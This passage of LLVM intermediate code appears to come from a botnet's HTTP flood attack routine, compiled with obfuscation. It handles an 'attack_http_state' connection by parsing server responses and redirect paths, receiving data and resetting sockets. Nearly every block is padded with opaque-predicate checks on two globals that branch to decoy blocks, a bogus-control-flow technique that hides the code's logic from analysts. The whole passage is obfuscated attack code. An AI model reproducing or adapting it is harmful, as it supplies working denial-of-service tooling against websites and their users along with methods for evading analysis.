  %3109 = or i1 %3107, %3108
  br i1 %3109, label %originalBBpart2639, label %originalBB637alteredBB

originalBBpart2639:                               ; preds = %originalBB637
  br label %3077

; <label>:3110:                                   ; preds = %3090
  %3111 = load i8*, i8** %65, align 8
  %3112 = load i32, i32* %18, align 4
  %3113 = sext i32 %3112 to i64
  %3114 = getelementptr inbounds i8, i8* %3111, i64 %3113
  store i8* %3114, i8** %65, align 8
  %3115 = load i8*, i8** %65, align 8
  %3116 = load i8*, i8** %65, align 8
  %3117 = call i32 @util_strlen(i8* %3116)
  %3118 = call i32 @util_stristr(i8* %3115, i32 %3117, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i32 0, i32 0))
  %3119 = icmp eq i32 %3118, 4
  br i1 %3119, label %3120, label %3258

; <label>:3120:                                   ; preds = %3110
  store i32 7, i32* %18, align 4
  %3121 = load i8*, i8** %65, align 8
  %3122 = getelementptr inbounds i8, i8* %3121, i64 4
  %3123 = load i8, i8* %3122, align 1
  %3124 = sext i8 %3123 to i32
  %3125 = icmp eq i32 %3124, 115
  br i1 %3125, label %3126, label %3129

; <label>:3126:                                   ; preds = %3120
  %3127 = load i32, i32* %18, align 4
  %3128 = add nsw i32 %3127, 1
  store i32 %3128, i32* %18, align 4
  br label %3129

; <label>:3129:                                   ; preds = %3126, %3120
  %3130 = load i8*, i8** %65, align 8
  %3131 = load i8*, i8** %65, align 8
  %3132 = load i32, i32* %18, align 4
  %3133 = sext i32 %3132 to i64
  %3134 = getelementptr inbounds i8, i8* %3131, i64 %3133
  %3135 = load i32, i32* %64, align 4
  %3136 = load i32, i32* %18, align 4
  %3137 = sub nsw i32 %3135, %3136
  %3138 = sext i32 %3137 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %3130, i8* %3134, i64 %3138, i32 1, i1 false)
  store i32 0, i32* %18, align 4
  br label %3139

; <label>:3139:                                   ; preds = %3176, %3129
  %3140 = load i8*, i8** %65, align 8
  %3141 = load i32, i32* %18, align 4
  %3142 = sext i32 %3141 to i64
  %3143 = getelementptr inbounds i8, i8* %3140, i64 %3142
  %3144 = load i8, i8* %3143, align 1
  %3145 = sext i8 %3144 to i32
  %3146 = icmp ne i32 %3145, 0
  br i1 %3146, label %3147, label %3179

; <label>:3147:                                   ; preds = %3139
  %3148 = load i8*, i8** %65, align 8
  %3149 = load i32, i32* %18, align 4
  %3150 = sext i32 %3149 to i64
  %3151 = getelementptr inbounds i8, i8* %3148, i64 %3150
  %3152 = load i8, i8* %3151, align 1
  %3153 = sext i8 %3152 to i32
  %3154 = icmp eq i32 %3153, 47
  br i1 %3154, label %3155, label %3176

; <label>:3155:                                   ; preds = %3147
  %3156 = load i32, i32* @x.17
  %3157 = load i32, i32* @y.18
  %3158 = sub i32 %3156, 1
  %3159 = mul i32 %3156, %3158
  %3160 = urem i32 %3159, 2
  %3161 = icmp eq i32 %3160, 0
  %3162 = icmp slt i32 %3157, 10
  %3163 = or i1 %3161, %3162
  br i1 %3163, label %originalBB641, label %originalBB641alteredBB

originalBB641:                                    ; preds = %originalBB641alteredBB, %3155
  %3164 = load i8*, i8** %65, align 8
  %3165 = load i32, i32* %18, align 4
  %3166 = sext i32 %3165 to i64
  %3167 = getelementptr inbounds i8, i8* %3164, i64 %3166
  store i8 0, i8* %3167, align 1
  %3168 = load i32, i32* @x.17
  %3169 = load i32, i32* @y.18
  %3170 = sub i32 %3168, 1
  %3171 = mul i32 %3168, %3170
  %3172 = urem i32 %3171, 2
  %3173 = icmp eq i32 %3172, 0
  %3174 = icmp slt i32 %3169, 10
  %3175 = or i1 %3173, %3174
  br i1 %3175, label %originalBBpart2643, label %originalBB641alteredBB

originalBBpart2643:                               ; preds = %originalBB641
  br label %3179

; <label>:3176:                                   ; preds = %3147
  %3177 = load i32, i32* %18, align 4
  %3178 = add nsw i32 %3177, 1
  store i32 %3178, i32* %18, align 4
  br label %3139

; <label>:3179:                                   ; preds = %originalBBpart2643, %3139
  %3180 = load i8*, i8** %65, align 8
  %3181 = call i32 @util_strlen(i8* %3180)
  %3182 = icmp sgt i32 %3181, 0
  br i1 %3182, label %3183, label %3209

; <label>:3183:                                   ; preds = %3179
  %3184 = load i8*, i8** %65, align 8
  %3185 = call i32 @util_strlen(i8* %3184)
  %3186 = icmp slt i32 %3185, 128
  br i1 %3186, label %3187, label %3209

; <label>:3187:                                   ; preds = %3183
  %3188 = load i32, i32* @x.17
  %3189 = load i32, i32* @y.18
  %3190 = sub i32 %3188, 1
  %3191 = mul i32 %3188, %3190
  %3192 = urem i32 %3191, 2
  %3193 = icmp eq i32 %3192, 0
  %3194 = icmp slt i32 %3189, 10
  %3195 = or i1 %3193, %3194
  br i1 %3195, label %originalBB645, label %originalBB645alteredBB

originalBB645:                                    ; preds = %originalBB645alteredBB, %3187
  %3196 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3197 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3196, i32 0, i32 7
  %3198 = getelementptr inbounds [129 x i8], [129 x i8]* %3197, i32 0, i32 0
  %3199 = load i8*, i8** %65, align 8
  %3200 = call i32 @util_strcpy(i8* %3198, i8* %3199)
  %3201 = load i32, i32* @x.17
  %3202 = load i32, i32* @y.18
  %3203 = sub i32 %3201, 1
  %3204 = mul i32 %3201, %3203
  %3205 = urem i32 %3204, 2
  %3206 = icmp eq i32 %3205, 0
  %3207 = icmp slt i32 %3202, 10
  %3208 = or i1 %3206, %3207
  br i1 %3208, label %originalBBpart2647, label %originalBB645alteredBB

originalBBpart2647:                               ; preds = %originalBB645
  br label %3209

; <label>:3209:                                   ; preds = %originalBBpart2647, %3183, %3179
  %3210 = load i8*, i8** %65, align 8
  %3211 = load i32, i32* %18, align 4
  %3212 = add nsw i32 %3211, 1
  %3213 = sext i32 %3212 to i64
  %3214 = getelementptr inbounds i8, i8* %3210, i64 %3213
  %3215 = call i32 @util_strlen(i8* %3214)
  %3216 = icmp slt i32 %3215, 256
  br i1 %3216, label %3217, label %3241

; <label>:3217:                                   ; preds = %3209
  %3218 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3219 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3218, i32 0, i32 6
  %3220 = getelementptr inbounds [257 x i8], [257 x i8]* %3219, i32 0, i32 0
  %3221 = getelementptr inbounds i8, i8* %3220, i64 1
  call void @util_zero(i8* %3221, i32 255)
  %3222 = load i8*, i8** %65, align 8
  %3223 = load i32, i32* %18, align 4
  %3224 = add nsw i32 %3223, 1
  %3225 = sext i32 %3224 to i64
  %3226 = getelementptr inbounds i8, i8* %3222, i64 %3225
  %3227 = call i32 @util_strlen(i8* %3226)
  %3228 = icmp sgt i32 %3227, 0
  br i1 %3228, label %3229, label %3240

; <label>:3229:                                   ; preds = %3217
  %3230 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3231 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3230, i32 0, i32 6
  %3232 = getelementptr inbounds [257 x i8], [257 x i8]* %3231, i32 0, i32 0
  %3233 = getelementptr inbounds i8, i8* %3232, i64 1
  %3234 = load i8*, i8** %65, align 8
  %3235 = load i32, i32* %18, align 4
  %3236 = add nsw i32 %3235, 1
  %3237 = sext i32 %3236 to i64
  %3238 = getelementptr inbounds i8, i8* %3234, i64 %3237
  %3239 = call i32 @util_strcpy(i8* %3233, i8* %3238)
  br label %3240

; <label>:3240:                                   ; preds = %3229, %3217
  br label %3241

; <label>:3241:                                   ; preds = %3240, %3209
  %3242 = load i32, i32* @x.17
  %3243 = load i32, i32* @y.18
  %3244 = sub i32 %3242, 1
  %3245 = mul i32 %3242, %3244
  %3246 = urem i32 %3245, 2
  %3247 = icmp eq i32 %3246, 0
  %3248 = icmp slt i32 %3243, 10
  %3249 = or i1 %3247, %3248
  br i1 %3249, label %originalBB649, label %originalBB649alteredBB

originalBB649:                                    ; preds = %originalBB649alteredBB, %3241
  %3250 = load i32, i32* @x.17
  %3251 = load i32, i32* @y.18
  %3252 = sub i32 %3250, 1
  %3253 = mul i32 %3250, %3252
  %3254 = urem i32 %3253, 2
  %3255 = icmp eq i32 %3254, 0
  %3256 = icmp slt i32 %3251, 10
  %3257 = or i1 %3255, %3256
  br i1 %3257, label %originalBBpart2651, label %originalBB649alteredBB

originalBBpart2651:                               ; preds = %originalBB649
  br label %3314

; <label>:3258:                                   ; preds = %3110
  %3259 = load i8*, i8** %65, align 8
  %3260 = getelementptr inbounds i8, i8* %3259, i64 0
  %3261 = load i8, i8* %3260, align 1
  %3262 = sext i8 %3261 to i32
  %3263 = icmp eq i32 %3262, 47
  br i1 %3263, label %3264, label %3313

; <label>:3264:                                   ; preds = %3258
  %3265 = load i8*, i8** %65, align 8
  %3266 = load i32, i32* %18, align 4
  %3267 = add nsw i32 %3266, 1
  %3268 = sext i32 %3267 to i64
  %3269 = getelementptr inbounds i8, i8* %3265, i64 %3268
  %3270 = call i32 @util_strlen(i8* %3269)
  %3271 = icmp slt i32 %3270, 256
  br i1 %3271, label %3272, label %3312

; <label>:3272:                                   ; preds = %3264
  %3273 = load i32, i32* @x.17
  %3274 = load i32, i32* @y.18
  %3275 = sub i32 %3273, 1
  %3276 = mul i32 %3273, %3275
  %3277 = urem i32 %3276, 2
  %3278 = icmp eq i32 %3277, 0
  %3279 = icmp slt i32 %3274, 10
  %3280 = or i1 %3278, %3279
  br i1 %3280, label %originalBB653, label %originalBB653alteredBB

originalBB653:                                    ; preds = %originalBB653alteredBB, %3272
  %3281 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3282 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3281, i32 0, i32 6
  %3283 = getelementptr inbounds [257 x i8], [257 x i8]* %3282, i32 0, i32 0
  %3284 = getelementptr inbounds i8, i8* %3283, i64 1
  call void @util_zero(i8* %3284, i32 255)
  %3285 = load i8*, i8** %65, align 8
  %3286 = load i32, i32* %18, align 4
  %3287 = add nsw i32 %3286, 1
  %3288 = sext i32 %3287 to i64
  %3289 = getelementptr inbounds i8, i8* %3285, i64 %3288
  %3290 = call i32 @util_strlen(i8* %3289)
  %3291 = icmp sgt i32 %3290, 0
  %3292 = load i32, i32* @x.17
  %3293 = load i32, i32* @y.18
  %3294 = sub i32 %3292, 1
  %3295 = mul i32 %3292, %3294
  %3296 = urem i32 %3295, 2
  %3297 = icmp eq i32 %3296, 0
  %3298 = icmp slt i32 %3293, 10
  %3299 = or i1 %3297, %3298
  br i1 %3299, label %originalBBpart2663, label %originalBB653alteredBB

originalBBpart2663:                               ; preds = %originalBB653
  br i1 %3291, label %3300, label %3311

; <label>:3300:                                   ; preds = %originalBBpart2663
  %3301 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3302 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3301, i32 0, i32 6
  %3303 = getelementptr inbounds [257 x i8], [257 x i8]* %3302, i32 0, i32 0
  %3304 = getelementptr inbounds i8, i8* %3303, i64 1
  %3305 = load i8*, i8** %65, align 8
  %3306 = load i32, i32* %18, align 4
  %3307 = add nsw i32 %3306, 1
  %3308 = sext i32 %3307 to i64
  %3309 = getelementptr inbounds i8, i8* %3305, i64 %3308
  %3310 = call i32 @util_strcpy(i8* %3304, i8* %3309)
  br label %3311

; <label>:3311:                                   ; preds = %3300, %originalBBpart2663
  br label %3312

; <label>:3312:                                   ; preds = %3311, %3264
  br label %3313

; <label>:3313:                                   ; preds = %3312, %3258
  br label %3314

; <label>:3314:                                   ; preds = %3313, %originalBBpart2651
  %3315 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3316 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3315, i32 0, i32 9
  %3317 = getelementptr inbounds [9 x i8], [9 x i8]* %3316, i32 0, i32 0
  %3318 = call i8* @strcpy(i8* %3317, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0)) #6
  %3319 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3320 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3319, i32 0, i32 1
  store i8 10, i8* %3320, align 4
  br label %4137

; <label>:3321:                                   ; preds = %originalBBpart2613
  br label %3322

; <label>:3322:                                   ; preds = %3321, %2783
  %3323 = load i32, i32* @x.17
  %3324 = load i32, i32* @y.18
  %3325 = sub i32 %3323, 1
  %3326 = mul i32 %3323, %3325
  %3327 = urem i32 %3326, 2
  %3328 = icmp eq i32 %3327, 0
  %3329 = icmp slt i32 %3324, 10
  %3330 = or i1 %3328, %3329
  br i1 %3330, label %originalBB665, label %originalBB665alteredBB

originalBB665:                                    ; preds = %originalBB665alteredBB, %3322
  %3331 = load i32, i32* @x.17
  %3332 = load i32, i32* @y.18
  %3333 = sub i32 %3331, 1
  %3334 = mul i32 %3331, %3333
  %3335 = urem i32 %3334, 2
  %3336 = icmp eq i32 %3335, 0
  %3337 = icmp slt i32 %3332, 10
  %3338 = or i1 %3336, %3337
  br i1 %3338, label %originalBBpart2667, label %originalBB665alteredBB

originalBBpart2667:                               ; preds = %originalBB665
  br label %3339

; <label>:3339:                                   ; preds = %originalBBpart2667, %originalBBpart2581
  %3340 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %3341 = load i32, i32* %20, align 4
  %3342 = call i32 @util_memsearch(i8* %3340, i32 %3341, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  store i32 %3342, i32* %45, align 4
  %3343 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3344 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3343, i32 0, i32 9
  %3345 = getelementptr inbounds [9 x i8], [9 x i8]* %3344, i32 0, i32 0
  %3346 = call signext i8 @util_strcmp(i8* %3345, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i32 0, i32 0))
  %3347 = sext i8 %3346 to i32
  %3348 = icmp ne i32 %3347, 0
  br i1 %3348, label %3372, label %3349

; <label>:3349:                                   ; preds = %3339
  %3350 = load i32, i32* @x.17
  %3351 = load i32, i32* @y.18
  %3352 = sub i32 %3350, 1
  %3353 = mul i32 %3350, %3352
  %3354 = urem i32 %3353, 2
  %3355 = icmp eq i32 %3354, 0
  %3356 = icmp slt i32 %3351, 10
  %3357 = or i1 %3355, %3356
  br i1 %3357, label %originalBB669, label %originalBB669alteredBB

originalBB669:                                    ; preds = %originalBB669alteredBB, %3349
  %3358 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3359 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3358, i32 0, i32 9
  %3360 = getelementptr inbounds [9 x i8], [9 x i8]* %3359, i32 0, i32 0
  %3361 = call signext i8 @util_strcmp(i8* %3360, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0))
  %3362 = sext i8 %3361 to i32
  %3363 = icmp ne i32 %3362, 0
  %3364 = load i32, i32* @x.17
  %3365 = load i32, i32* @y.18
  %3366 = sub i32 %3364, 1
  %3367 = mul i32 %3364, %3366
  %3368 = urem i32 %3367, 2
  %3369 = icmp eq i32 %3368, 0
  %3370 = icmp slt i32 %3365, 10
  %3371 = or i1 %3369, %3370
  br i1 %3371, label %originalBBpart2671, label %originalBB669alteredBB

originalBBpart2671:                               ; preds = %originalBB669
  br i1 %3363, label %3372, label %3391

; <label>:3372:                                   ; preds = %originalBBpart2671, %3339
  %3373 = load i32, i32* @x.17
  %3374 = load i32, i32* @y.18
  %3375 = sub i32 %3373, 1
  %3376 = mul i32 %3373, %3375
  %3377 = urem i32 %3376, 2
  %3378 = icmp eq i32 %3377, 0
  %3379 = icmp slt i32 %3374, 10
  %3380 = or i1 %3378, %3379
  br i1 %3380, label %originalBB673, label %originalBB673alteredBB

originalBB673:                                    ; preds = %originalBB673alteredBB, %3372
  %3381 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3382 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3381, i32 0, i32 1
  store i8 7, i8* %3382, align 4
  %3383 = load i32, i32* @x.17
  %3384 = load i32, i32* @y.18
  %3385 = sub i32 %3383, 1
  %3386 = mul i32 %3383, %3385
  %3387 = urem i32 %3386, 2
  %3388 = icmp eq i32 %3387, 0
  %3389 = icmp slt i32 %3384, 10
  %3390 = or i1 %3388, %3389
  br i1 %3390, label %originalBBpart2675, label %originalBB673alteredBB

originalBBpart2675:                               ; preds = %originalBB673
  br label %3402

; <label>:3391:                                   ; preds = %originalBBpart2671
  %3392 = load i32, i32* %20, align 4
  %3393 = load i32, i32* %45, align 4
  %3394 = icmp sgt i32 %3392, %3393
  br i1 %3394, label %3395, label %3398

; <label>:3395:                                   ; preds = %3391
  %3396 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3397 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3396, i32 0, i32 1
  store i8 10, i8* %3397, align 4
  br label %3401

; <label>:3398:                                   ; preds = %3391
  %3399 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3400 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3399, i32 0, i32 1
  store i8 1, i8* %3400, align 4
  br label %3401

; <label>:3401:                                   ; preds = %3398, %3395
  br label %3402

; <label>:3402:                                   ; preds = %3401, %originalBBpart2675
  %3403 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3404 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3403, i32 0, i32 0
  %3405 = load i32, i32* %3404, align 4
  %3406 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %3407 = load i32, i32* %45, align 4
  %3408 = sext i32 %3407 to i64
  %3409 = call i64 @recv(i32 %3405, i8* %3406, i64 %3408, i32 16384)
  %3410 = trunc i64 %3409 to i32
  store i32 %3410, i32* %20, align 4
  br label %4119

; <label>:3411:                                   ; preds = %originalBBpart2339
  %3412 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3413 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3412, i32 0, i32 1
  %3414 = load i8, i8* %3413, align 4
  %3415 = zext i8 %3414 to i32
  %3416 = icmp eq i32 %3415, 7
  br i1 %3416, label %3417, label %4002

; <label>:3417:                                   ; preds = %3411
  br label %3418

; <label>:3418:                                   ; preds = %3984, %3417
  %3419 = load i32, i32* @x.17
  %3420 = load i32, i32* @y.18
  %3421 = sub i32 %3419, 1
  %3422 = mul i32 %3419, %3421
  %3423 = urem i32 %3422, 2
  %3424 = icmp eq i32 %3423, 0
  %3425 = icmp slt i32 %3420, 10
  %3426 = or i1 %3424, %3425
  br i1 %3426, label %originalBB677, label %originalBB677alteredBB

originalBB677:                                    ; preds = %originalBB677alteredBB, %3418
  %3427 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3428 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3427, i32 0, i32 1
  %3429 = load i8, i8* %3428, align 4
  %3430 = zext i8 %3429 to i32
  %3431 = icmp ne i32 %3430, 7
  %3432 = load i32, i32* @x.17
  %3433 = load i32, i32* @y.18
  %3434 = sub i32 %3432, 1
  %3435 = mul i32 %3432, %3434
  %3436 = urem i32 %3435, 2
  %3437 = icmp eq i32 %3436, 0
  %3438 = icmp slt i32 %3433, 10
  %3439 = or i1 %3437, %3438
  br i1 %3439, label %originalBBpart2679, label %originalBB677alteredBB

originalBBpart2679:                               ; preds = %originalBB677
  br i1 %3431, label %3440, label %3441

; <label>:3440:                                   ; preds = %originalBBpart2679
  br label %3985

; <label>:3441:                                   ; preds = %originalBBpart2679
  %3442 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3443 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3442, i32 0, i32 17
  %3444 = load i32, i32* %3443, align 4
  %3445 = icmp eq i32 %3444, 1024
  br i1 %3445, label %3446, label %3458

; <label>:3446:                                   ; preds = %3441
  %3447 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3448 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3447, i32 0, i32 18
  %3449 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3448, i32 0, i32 0
  %3450 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3451 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3450, i32 0, i32 18
  %3452 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3451, i32 0, i32 0
  %3453 = getelementptr inbounds i8, i8* %3452, i64 64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %3449, i8* %3453, i64 960, i32 1, i1 false)
  %3454 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3455 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3454, i32 0, i32 17
  %3456 = load i32, i32* %3455, align 4
  %3457 = sub nsw i32 %3456, 64
  store i32 %3457, i32* %3455, align 4
  br label %3458

; <label>:3458:                                   ; preds = %3446, %3441
  %3459 = call i32* @__errno_location() #7
  store i32 0, i32* %3459, align 4
  %3460 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3461 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3460, i32 0, i32 0
  %3462 = load i32, i32* %3461, align 4
  %3463 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3464 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3463, i32 0, i32 18
  %3465 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3464, i32 0, i32 0
  %3466 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3467 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3466, i32 0, i32 17
  %3468 = load i32, i32* %3467, align 4
  %3469 = sext i32 %3468 to i64
  %3470 = getelementptr inbounds i8, i8* %3465, i64 %3469
  %3471 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3472 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3471, i32 0, i32 17
  %3473 = load i32, i32* %3472, align 4
  %3474 = sub nsw i32 1024, %3473
  %3475 = sext i32 %3474 to i64
  %3476 = call i64 @recv(i32 %3462, i8* %3470, i64 %3475, i32 16384)
  %3477 = trunc i64 %3476 to i32
  store i32 %3477, i32* %20, align 4
  %3478 = load i32, i32* %20, align 4
  %3479 = icmp eq i32 %3478, 0
  br i1 %3479, label %3480, label %3482

; <label>:3480:                                   ; preds = %3458
  %3481 = call i32* @__errno_location() #7
  store i32 104, i32* %3481, align 4
  store i32 -1, i32* %20, align 4
  br label %3482

; <label>:3482:                                   ; preds = %3480, %3458
  %3483 = load i32, i32* %20, align 4
  %3484 = icmp eq i32 %3483, -1
  br i1 %3484, label %3485, label %3519

; <label>:3485:                                   ; preds = %3482
  %3486 = load i32, i32* @x.17
  %3487 = load i32, i32* @y.18
  %3488 = sub i32 %3486, 1
  %3489 = mul i32 %3486, %3488
  %3490 = urem i32 %3489, 2
  %3491 = icmp eq i32 %3490, 0
  %3492 = icmp slt i32 %3487, 10
  %3493 = or i1 %3491, %3492
  br i1 %3493, label %originalBB681, label %originalBB681alteredBB

originalBB681:                                    ; preds = %originalBB681alteredBB, %3485
  %3494 = call i32* @__errno_location() #7
  %3495 = load i32, i32* %3494, align 4
  %3496 = icmp ne i32 %3495, 11
  %3497 = load i32, i32* @x.17
  %3498 = load i32, i32* @y.18
  %3499 = sub i32 %3497, 1
  %3500 = mul i32 %3497, %3499
  %3501 = urem i32 %3500, 2
  %3502 = icmp eq i32 %3501, 0
  %3503 = icmp slt i32 %3498, 10
  %3504 = or i1 %3502, %3503
  br i1 %3504, label %originalBBpart2683, label %originalBB681alteredBB

originalBBpart2683:                               ; preds = %originalBB681
  br i1 %3496, label %3505, label %3518

; <label>:3505:                                   ; preds = %originalBBpart2683
  %3506 = call i32* @__errno_location() #7
  %3507 = load i32, i32* %3506, align 4
  %3508 = icmp ne i32 %3507, 11
  br i1 %3508, label %3509, label %3518

; <label>:3509:                                   ; preds = %3505
  %3510 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3511 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3510, i32 0, i32 0
  %3512 = load i32, i32* %3511, align 4
  %3513 = call i32 @close(i32 %3512)
  %3514 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3515 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3514, i32 0, i32 0
  store i32 -1, i32* %3515, align 4
  %3516 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3517 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3516, i32 0, i32 1
  store i8 0, i8* %3517, align 4
  br label %3518

; <label>:3518:                                   ; preds = %3509, %3505, %originalBBpart2683
  br label %3985

; <label>:3519:                                   ; preds = %3482
  %3520 = load i32, i32* %20, align 4
  %3521 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3522 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3521, i32 0, i32 17
  %3523 = load i32, i32* %3522, align 4
  %3524 = add nsw i32 %3523, %3520
  store i32 %3524, i32* %3522, align 4
  %3525 = load i32, i32* %35, align 4
  %3526 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3527 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3526, i32 0, i32 2
  store i32 %3525, i32* %3527, align 4
  br label %3528

; <label>:3528:                                   ; preds = %3983, %3519
  %3529 = load i32, i32* @x.17
  %3530 = load i32, i32* @y.18
  %3531 = sub i32 %3529, 1
  %3532 = mul i32 %3529, %3531
  %3533 = urem i32 %3532, 2
  %3534 = icmp eq i32 %3533, 0
  %3535 = icmp slt i32 %3530, 10
  %3536 = or i1 %3534, %3535
  br i1 %3536, label %originalBB685, label %originalBB685alteredBB

originalBB685:                                    ; preds = %originalBB685alteredBB, %3528
  store i32 0, i32* %67, align 4
  %3537 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3538 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3537, i32 0, i32 14
  %3539 = load i32, i32* %3538, align 4
  %3540 = icmp sgt i32 %3539, 0
  %3541 = load i32, i32* @x.17
  %3542 = load i32, i32* @y.18
  %3543 = sub i32 %3541, 1
  %3544 = mul i32 %3541, %3543
  %3545 = urem i32 %3544, 2
  %3546 = icmp eq i32 %3545, 0
  %3547 = icmp slt i32 %3542, 10
  %3548 = or i1 %3546, %3547
  br i1 %3548, label %originalBBpart2687, label %originalBB685alteredBB

originalBBpart2687:                               ; preds = %originalBB685
  br i1 %3540, label %3549, label %3752

; <label>:3549:                                   ; preds = %originalBBpart2687
  %3550 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3551 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3550, i32 0, i32 14
  %3552 = load i32, i32* %3551, align 4
  %3553 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3554 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3553, i32 0, i32 17
  %3555 = load i32, i32* %3554, align 4
  %3556 = icmp sgt i32 %3552, %3555
  br i1 %3556, label %3557, label %3561

; <label>:3557:                                   ; preds = %3549
  %3558 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3559 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3558, i32 0, i32 17
  %3560 = load i32, i32* %3559, align 4
  br label %3565

; <label>:3561:                                   ; preds = %3549
  %3562 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3563 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3562, i32 0, i32 14
  %3564 = load i32, i32* %3563, align 4
  br label %3565

; <label>:3565:                                   ; preds = %3561, %3557
  %3566 = phi i32 [ %3560, %3557 ], [ %3564, %3561 ]
  %3567 = load i32, i32* @x.17
  %3568 = load i32, i32* @y.18
  %3569 = sub i32 %3567, 1
  %3570 = mul i32 %3567, %3569
  %3571 = urem i32 %3570, 2
  %3572 = icmp eq i32 %3571, 0
  %3573 = icmp slt i32 %3568, 10
  %3574 = or i1 %3572, %3573
  br i1 %3574, label %originalBB689, label %originalBB689alteredBB

originalBB689:                                    ; preds = %originalBB689alteredBB, %3565
  store i32 %3566, i32* %67, align 4
  %3575 = load i32, i32* %67, align 4
  %3576 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3577 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3576, i32 0, i32 14
  %3578 = load i32, i32* %3577, align 4
  %3579 = sub nsw i32 %3578, %3575
  store i32 %3579, i32* %3577, align 4
  %3580 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3581 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3580, i32 0, i32 11
  %3582 = load i32, i32* %3581, align 4
  %3583 = icmp eq i32 %3582, 1
  %3584 = load i32, i32* @x.17
  %3585 = load i32, i32* @y.18
  %3586 = sub i32 %3584, 1
  %3587 = mul i32 %3584, %3586
  %3588 = urem i32 %3587, 2
  %3589 = icmp eq i32 %3588, 0
  %3590 = icmp slt i32 %3585, 10
  %3591 = or i1 %3589, %3590
  br i1 %3591, label %originalBBpart2691, label %originalBB689alteredBB

originalBBpart2691:                               ; preds = %originalBB689
  br i1 %3583, label %3592, label %3751

; <label>:3592:                                   ; preds = %originalBBpart2691
  %3593 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
